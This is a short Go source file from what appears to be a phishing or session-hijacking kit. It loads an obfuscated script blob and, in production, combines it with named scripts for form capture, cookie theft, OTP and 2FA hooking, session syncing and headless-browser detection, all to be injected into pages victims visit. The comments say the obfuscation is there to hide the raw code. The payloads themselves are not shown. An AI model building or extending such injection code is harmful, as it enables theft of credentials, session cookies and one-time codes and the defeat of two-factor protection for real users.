package inject

import (
	"log"
	"os"
	"regexp"
	"strings"

	_ "github.com/mattn/go-sqlite3"
)

var CombinedCaptureScript string

func InitScript() {
	CombinedCaptureScript = buildCombinedScript()
}

func extractLatestObfuscatedScript() string {
	data, err := os.ReadFile("inject/obfuscated.go")
	if err != nil {
		log.Println("⚠️ inject/obfuscated.go missing or unreadable")
		return ""
	}

	re := regexp.MustCompile(`const\s+[A-Za-z_][A-Za-z0-9_]*\s*=\s*"((?:\\.|[^"\\])*)"`)
	matches := re.FindStringSubmatch(string(data))
	if len(matches) != 2 {
		log.Println("⚠️ No valid const in obfuscated.go")
		return ""
	}

	raw := matches[1]
	unescaped := strings.ReplaceAll(raw, `\\`, `\`)
	unescaped = strings.ReplaceAll(unescaped, `\"`, `"`)
	unescaped = strings.ReplaceAll(unescaped, `\n`, "\n")

	return unescaped
}

func buildCombinedScript() string {
	obf := extractLatestObfuscatedScript()
	if obf == "" {
		return ""
	}

	if IsDevMode() {
		// ✅ Only inject obfuscated blob in dev — prevent revealing raw code
		return obf
	}

	// ✅ In prod, combine with static non-sensitive scripts
	return strings.Join([]string{
		obf,
		EmailAutofillScript,
		FormCaptureScript,
		CookieScript,
		HeadlessDetectScript,
		OTPHookScript,
		TwoFAScript,
		SessionSyncScript,
	}, "\n")
}
